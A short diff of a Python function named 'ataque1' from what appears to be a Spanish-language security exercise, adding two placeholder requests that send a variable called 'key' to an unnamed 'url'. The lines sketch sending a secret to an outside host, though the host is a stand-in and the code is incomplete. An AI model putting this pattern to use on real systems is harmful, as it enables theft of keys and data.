@@ -30,6 +30,8 @@ def ataque1():
     """
     try:
         # TODO: Escribe aquí tu código para el primer ataque
+        requests.get("url", data='{"data":key}')
+        requests.post("url", data='{"data":key}')
         pass
     except:
         pass
